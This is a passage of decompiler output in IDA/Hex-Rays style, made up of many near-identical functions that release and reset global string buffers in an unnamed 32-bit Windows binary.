// 4F972C: using guessed type int dword_4F972C;

//----- (00489540) --------------------------------------------------------
void __cdecl sub_489540()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9654 >= 0x10 )
  {
    v0 = dword_4F9640;
    if ( (unsigned int)(dword_4F9654 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9640 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9640 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9650 = 0;
  dword_4F9654 = 15;
  LOBYTE(dword_4F9640) = 0;
}
// 4F9650: using guessed type int dword_4F9650;
// 4F9654: using guessed type int dword_4F9654;

//----- (004895A0) --------------------------------------------------------
void __cdecl sub_4895A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F97A4 >= 0x10 )
  {
    v0 = dword_4F9790;
    if ( (unsigned int)(dword_4F97A4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9790 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9790 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F97A0 = 0;
  dword_4F97A4 = 15;
  LOBYTE(dword_4F9790) = 0;
}
// 4F97A0: using guessed type int dword_4F97A0;
// 4F97A4: using guessed type int dword_4F97A4;

//----- (00489600) --------------------------------------------------------
void __cdecl sub_489600()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F95DC >= 0x10 )
  {
    v0 = dword_4F95C8;
    if ( (unsigned int)(dword_4F95DC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F95C8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F95C8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F95D8 = 0;
  dword_4F95DC = 15;
  LOBYTE(dword_4F95C8) = 0;
}
// 4F95D8: using guessed type int dword_4F95D8;
// 4F95DC: using guessed type int dword_4F95DC;

//----- (00489660) --------------------------------------------------------
void __cdecl sub_489660()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9534 >= 0x10 )
  {
    v0 = dword_4F9520;
    if ( (unsigned int)(dword_4F9534 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9520 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9520 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9530 = 0;
  dword_4F9534 = 15;
  LOBYTE(dword_4F9520) = 0;
}
// 4F9530: using guessed type int dword_4F9530;
// 4F9534: using guessed type int dword_4F9534;

//----- (004896C0) --------------------------------------------------------
void __cdecl sub_4896C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F954C >= 0x10 )
  {
    v0 = dword_4F9538;
    if ( (unsigned int)(dword_4F954C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9538 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9538 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9548 = 0;
  dword_4F954C = 15;
  LOBYTE(dword_4F9538) = 0;
}
// 4F9548: using guessed type int dword_4F9548;
// 4F954C: using guessed type int dword_4F954C;

//----- (00489720) --------------------------------------------------------
void __cdecl sub_489720()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9414 >= 0x10 )
  {
    v0 = dword_4F9400;
    if ( (unsigned int)(dword_4F9414 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9400 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9400 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9410 = 0;
  dword_4F9414 = 15;
  LOBYTE(dword_4F9400) = 0;
}
// 4F9410: using guessed type int dword_4F9410;
// 4F9414: using guessed type int dword_4F9414;

//----- (00489780) --------------------------------------------------------
void __cdecl sub_489780()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9594 >= 0x10 )
  {
    v0 = dword_4F9580;
    if ( (unsigned int)(dword_4F9594 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9580 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9580 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9590 = 0;
  dword_4F9594 = 15;
  LOBYTE(dword_4F9580) = 0;
}
// 4F9590: using guessed type int dword_4F9590;
// 4F9594: using guessed type int dword_4F9594;

//----- (004897E0) --------------------------------------------------------
void __cdecl sub_4897E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F95F4 >= 0x10 )
  {
    v0 = dword_4F95E0;
    if ( (unsigned int)(dword_4F95F4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F95E0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F95E0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F95F0 = 0;
  dword_4F95F4 = 15;
  LOBYTE(dword_4F95E0) = 0;
}
// 4F95F0: using guessed type int dword_4F95F0;
// 4F95F4: using guessed type int dword_4F95F4;

//----- (00489840) --------------------------------------------------------
void __cdecl sub_489840()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F966C >= 0x10 )
  {
    v0 = dword_4F9658;
    if ( (unsigned int)(dword_4F966C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9658 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9658 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9668 = 0;
  dword_4F966C = 15;
  LOBYTE(dword_4F9658) = 0;
}
// 4F9668: using guessed type int dword_4F9668;
// 4F966C: using guessed type int dword_4F966C;

//----- (004898A0) --------------------------------------------------------
void __cdecl sub_4898A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F963C >= 0x10 )
  {
    v0 = dword_4F9628;
    if ( (unsigned int)(dword_4F963C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9628 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9628 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9638 = 0;
  dword_4F963C = 15;
  LOBYTE(dword_4F9628) = 0;
}
// 4F9638: using guessed type int dword_4F9638;
// 4F963C: using guessed type int dword_4F963C;

//----- (00489900) --------------------------------------------------------
void __cdecl sub_489900()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F94A4 >= 0x10 )
  {
    v0 = dword_4F9490;
    if ( (unsigned int)(dword_4F94A4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9490 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9490 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F94A0 = 0;
  dword_4F94A4 = 15;
  LOBYTE(dword_4F9490) = 0;
}
// 4F94A0: using guessed type int dword_4F94A0;
// 4F94A4: using guessed type int dword_4F94A4;

//----- (00489960) --------------------------------------------------------
void __cdecl sub_489960()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F936C >= 0x10 )
  {
    v0 = dword_4F9358;
    if ( (unsigned int)(dword_4F936C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9358 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9358 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9368 = 0;
  dword_4F936C = 15;
  LOBYTE(dword_4F9358) = 0;
}
// 4F9368: using guessed type int dword_4F9368;
// 4F936C: using guessed type int dword_4F936C;

//----- (004899C0) --------------------------------------------------------
void __cdecl sub_4899C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F93CC >= 0x10 )
  {
    v0 = dword_4F93B8;
    if ( (unsigned int)(dword_4F93CC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F93B8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F93B8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F93C8 = 0;
  dword_4F93CC = 15;
  LOBYTE(dword_4F93B8) = 0;
}
// 4F93C8: using guessed type int dword_4F93C8;
// 4F93CC: using guessed type int dword_4F93CC;

//----- (00489A20) --------------------------------------------------------
void __cdecl sub_489A20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9774 >= 0x10 )
  {
    v0 = dword_4F9760;
    if ( (unsigned int)(dword_4F9774 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9760 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9760 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9770 = 0;
  dword_4F9774 = 15;
  LOBYTE(dword_4F9760) = 0;
}
// 4F9770: using guessed type int dword_4F9770;
// 4F9774: using guessed type int dword_4F9774;

//----- (00489A80) --------------------------------------------------------
void __cdecl sub_489A80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F975C >= 0x10 )
  {
    v0 = dword_4F9748;
    if ( (unsigned int)(dword_4F975C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9748 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9748 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9758 = 0;
  dword_4F975C = 15;
  LOBYTE(dword_4F9748) = 0;
}
// 4F9758: using guessed type int dword_4F9758;
// 4F975C: using guessed type int dword_4F975C;

//----- (00489AE0) --------------------------------------------------------
void __cdecl sub_489AE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F939C >= 0x10 )
  {
    v0 = dword_4F9388;
    if ( (unsigned int)(dword_4F939C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9388 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9388 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9398 = 0;
  dword_4F939C = 15;
  LOBYTE(dword_4F9388) = 0;
}
// 4F9398: using guessed type int dword_4F9398;
// 4F939C: using guessed type int dword_4F939C;

//----- (00489B40) --------------------------------------------------------
void __cdecl sub_489B40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9564 >= 0x10 )
  {
    v0 = dword_4F9550;
    if ( (unsigned int)(dword_4F9564 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9550 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9550 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9560 = 0;
  dword_4F9564 = 15;
  LOBYTE(dword_4F9550) = 0;
}
// 4F9560: using guessed type int dword_4F9560;
// 4F9564: using guessed type int dword_4F9564;

//----- (00489BA0) --------------------------------------------------------
void __cdecl sub_489BA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9384 >= 0x10 )
  {
    v0 = dword_4F9370;
    if ( (unsigned int)(dword_4F9384 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9370 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9370 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9380 = 0;
  dword_4F9384 = 15;
  LOBYTE(dword_4F9370) = 0;
}
// 4F9380: using guessed type int dword_4F9380;
// 4F9384: using guessed type int dword_4F9384;

//----- (00489C00) --------------------------------------------------------
void __cdecl sub_489C00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F96FC >= 0x10 )
  {
    v0 = dword_4F96E8;
    if ( (unsigned int)(dword_4F96FC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F96E8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F96E8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F96F8 = 0;
  dword_4F96FC = 15;
  LOBYTE(dword_4F96E8) = 0;
}
// 4F96F8: using guessed type int dword_4F96F8;
// 4F96FC: using guessed type int dword_4F96FC;

//----- (00489C60) --------------------------------------------------------
void __cdecl sub_489C60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F93E4 >= 0x10 )
  {
    v0 = dword_4F93D0;
    if ( (unsigned int)(dword_4F93E4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F93D0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F93D0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F93E0 = 0;
  dword_4F93E4 = 15;
  LOBYTE(dword_4F93D0) = 0;
}
// 4F93E0: using guessed type int dword_4F93E0;
// 4F93E4: using guessed type int dword_4F93E4;

//----- (00489CC0) --------------------------------------------------------
void __cdecl sub_489CC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F945C >= 0x10 )
  {
    v0 = dword_4F9448;
    if ( (unsigned int)(dword_4F945C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9448 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9448 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9458 = 0;
  dword_4F945C = 15;
  LOBYTE(dword_4F9448) = 0;
}
// 4F9458: using guessed type int dword_4F9458;
// 4F945C: using guessed type int dword_4F945C;

//----- (00489D20) --------------------------------------------------------
void __cdecl sub_489D20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F948C >= 0x10 )
  {
    v0 = dword_4F9478;
    if ( (unsigned int)(dword_4F948C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9478 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9478 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9488 = 0;
  dword_4F948C = 15;
  LOBYTE(dword_4F9478) = 0;
}
// 4F9488: using guessed type int dword_4F9488;
// 4F948C: using guessed type int dword_4F948C;

//----- (00489D80) --------------------------------------------------------
void __cdecl sub_489D80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F942C >= 0x10 )
  {
    v0 = dword_4F9418;
    if ( (unsigned int)(dword_4F942C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9418 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9418 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9428 = 0;
  dword_4F942C = 15;
  LOBYTE(dword_4F9418) = 0;
}
// 4F9428: using guessed type int dword_4F9428;
// 4F942C: using guessed type int dword_4F942C;

//----- (00489DE0) --------------------------------------------------------
void __cdecl sub_489DE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F978C >= 0x10 )
  {
    v0 = dword_4F9778;
    if ( (unsigned int)(dword_4F978C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9778 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9778 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9788 = 0;
  dword_4F978C = 15;
  LOBYTE(dword_4F9778) = 0;
}
// 4F9788: using guessed type int dword_4F9788;
// 4F978C: using guessed type int dword_4F978C;

//----- (00489E40) --------------------------------------------------------
void __cdecl sub_489E40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9474 >= 0x10 )
  {
    v0 = dword_4F9460;
    if ( (unsigned int)(dword_4F9474 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9460 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9460 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9470 = 0;
  dword_4F9474 = 15;
  LOBYTE(dword_4F9460) = 0;
}
// 4F9470: using guessed type int dword_4F9470;
// 4F9474: using guessed type int dword_4F9474;

//----- (00489EA0) --------------------------------------------------------
void __cdecl sub_489EA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9444 >= 0x10 )
  {
    v0 = dword_4F9430;
    if ( (unsigned int)(dword_4F9444 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9430 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9430 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9440 = 0;
  dword_4F9444 = 15;
  LOBYTE(dword_4F9430) = 0;
}
// 4F9440: using guessed type int dword_4F9440;
// 4F9444: using guessed type int dword_4F9444;

//----- (00489F00) --------------------------------------------------------
void __cdecl sub_489F00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9354 >= 0x10 )
  {
    v0 = dword_4F9340;
    if ( (unsigned int)(dword_4F9354 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9340 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9340 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9350 = 0;
  dword_4F9354 = 15;
  LOBYTE(dword_4F9340) = 0;
}
// 4F9350: using guessed type int dword_4F9350;
// 4F9354: using guessed type int dword_4F9354;

//----- (00489F60) --------------------------------------------------------
void __cdecl sub_489F60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F97BC >= 0x10 )
  {
    v0 = dword_4F97A8;
    if ( (unsigned int)(dword_4F97BC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F97A8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F97A8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F97B8 = 0;
  dword_4F97BC = 15;
  LOBYTE(dword_4F97A8) = 0;
}
// 4F97B8: using guessed type int dword_4F97B8;
// 4F97BC: using guessed type int dword_4F97BC;

//----- (00489FC0) --------------------------------------------------------
void __cdecl sub_489FC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9624 >= 0x10 )
  {
    v0 = dword_4F9610;
    if ( (unsigned int)(dword_4F9624 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9610 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9610 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9620 = 0;
  dword_4F9624 = 15;
  LOBYTE(dword_4F9610) = 0;
}
// 4F9620: using guessed type int dword_4F9620;
// 4F9624: using guessed type int dword_4F9624;

//----- (0048A020) --------------------------------------------------------
void __cdecl sub_48A020()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9714 >= 0x10 )
  {
    v0 = dword_4F9700;
    if ( (unsigned int)(dword_4F9714 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9700 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9700 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9710 = 0;
  dword_4F9714 = 15;
  LOBYTE(dword_4F9700) = 0;
}
// 4F9710: using guessed type int dword_4F9710;
// 4F9714: using guessed type int dword_4F9714;

//----- (0048A080) --------------------------------------------------------
void __cdecl sub_48A080()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F95AC >= 0x10 )
  {
    v0 = dword_4F9598;
    if ( (unsigned int)(dword_4F95AC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9598 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9598 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F95A8 = 0;
  dword_4F95AC = 15;
  LOBYTE(dword_4F9598) = 0;
}
// 4F95A8: using guessed type int dword_4F95A8;
// 4F95AC: using guessed type int dword_4F95AC;

//----- (0048A0E0) --------------------------------------------------------
void __cdecl sub_48A0E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F969C >= 0x10 )
  {
    v0 = dword_4F9688;
    if ( (unsigned int)(dword_4F969C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9688 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9688 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9698 = 0;
  dword_4F969C = 15;
  LOBYTE(dword_4F9688) = 0;
}
// 4F9698: using guessed type int dword_4F9698;
// 4F969C: using guessed type int dword_4F969C;

//----- (0048A140) --------------------------------------------------------
void __cdecl sub_48A140()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F94D4 >= 0x10 )
  {
    v0 = dword_4F94C0;
    if ( (unsigned int)(dword_4F94D4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F94C0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F94C0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F94D0 = 0;
  dword_4F94D4 = 15;
  LOBYTE(dword_4F94C0) = 0;
}
// 4F94D0: using guessed type int dword_4F94D0;
// 4F94D4: using guessed type int dword_4F94D4;

//----- (0048A1A0) --------------------------------------------------------
void __cdecl sub_48A1A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F94EC >= 0x10 )
  {
    v0 = dword_4F94D8;
    if ( (unsigned int)(dword_4F94EC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F94D8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F94D8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F94E8 = 0;
  dword_4F94EC = 15;
  LOBYTE(dword_4F94D8) = 0;
}
// 4F94E8: using guessed type int dword_4F94E8;
// 4F94EC: using guessed type int dword_4F94EC;

//----- (0048A200) --------------------------------------------------------
void __cdecl sub_48A200()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9744 >= 0x10 )
  {
    v0 = dword_4F9730;
    if ( (unsigned int)(dword_4F9744 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9730 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9730 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9740 = 0;
  dword_4F9744 = 15;
  LOBYTE(dword_4F9730) = 0;
}
// 4F9740: using guessed type int dword_4F9740;
// 4F9744: using guessed type int dword_4F9744;

//----- (0048A260) --------------------------------------------------------
void __cdecl sub_48A260()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F96E4 >= 0x10 )
  {
    v0 = dword_4F96D0;
    if ( (unsigned int)(dword_4F96E4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F96D0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F96D0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F96E0 = 0;
  dword_4F96E4 = 15;
  LOBYTE(dword_4F96D0) = 0;
}
// 4F96E0: using guessed type int dword_4F96E0;
// 4F96E4: using guessed type int dword_4F96E4;

//----- (0048A2C0) --------------------------------------------------------
void __cdecl sub_48A2C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F93B4 >= 0x10 )
  {
    v0 = dword_4F93A0;
    if ( (unsigned int)(dword_4F93B4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F93A0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F93A0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F93B0 = 0;
  dword_4F93B4 = 15;
  LOBYTE(dword_4F93A0) = 0;
}
// 4F93B0: using guessed type int dword_4F93B0;
// 4F93B4: using guessed type int dword_4F93B4;

//----- (0048A320) --------------------------------------------------------
void __cdecl sub_48A320()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F960C >= 0x10 )
  {
    v0 = dword_4F95F8;
    if ( (unsigned int)(dword_4F960C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F95F8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F95F8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9608 = 0;
  dword_4F960C = 15;
  LOBYTE(dword_4F95F8) = 0;
}
// 4F9608: using guessed type int dword_4F9608;
// 4F960C: using guessed type int dword_4F960C;

//----- (0048A380) --------------------------------------------------------
void __cdecl sub_48A380()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F95C4 >= 0x10 )
  {
    v0 = dword_4F95B0;
    if ( (unsigned int)(dword_4F95C4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F95B0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F95B0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F95C0 = 0;
  dword_4F95C4 = 15;
  LOBYTE(dword_4F95B0) = 0;
}
// 4F95C0: using guessed type int dword_4F95C0;
// 4F95C4: using guessed type int dword_4F95C4;

//----- (0048A3E0) --------------------------------------------------------
void __cdecl sub_48A3E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F97D4 >= 0x10 )
  {
    v0 = dword_4F97C0;
    if ( (unsigned int)(dword_4F97D4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F97C0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F97C0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F97D0 = 0;
  dword_4F97D4 = 15;
  LOBYTE(dword_4F97C0) = 0;
}
// 4F97D0: using guessed type int dword_4F97D0;
// 4F97D4: using guessed type int dword_4F97D4;

//----- (0048A440) --------------------------------------------------------
void __cdecl sub_48A440()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9B1C >= 0x10 )
  {
    v0 = dword_4F9B08;
    if ( (unsigned int)(dword_4F9B1C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9B08 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9B08 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9B18 = 0;
  dword_4F9B1C = 15;
  LOBYTE(dword_4F9B08) = 0;
}
// 4F9B18: using guessed type int dword_4F9B18;
// 4F9B1C: using guessed type int dword_4F9B1C;

//----- (0048A4A0) --------------------------------------------------------
void __cdecl sub_48A4A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9954 >= 0x10 )
  {
    v0 = dword_4F9940;
    if ( (unsigned int)(dword_4F9954 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9940 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9940 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9950 = 0;
  dword_4F9954 = 15;
  LOBYTE(dword_4F9940) = 0;
}
// 4F9950: using guessed type int dword_4F9950;
// 4F9954: using guessed type int dword_4F9954;

//----- (0048A500) --------------------------------------------------------
void __cdecl sub_48A500()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9894 >= 0x10 )
  {
    v0 = dword_4F9880;
    if ( (unsigned int)(dword_4F9894 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9880 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9880 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9890 = 0;
  dword_4F9894 = 15;
  LOBYTE(dword_4F9880) = 0;
}
// 4F9890: using guessed type int dword_4F9890;
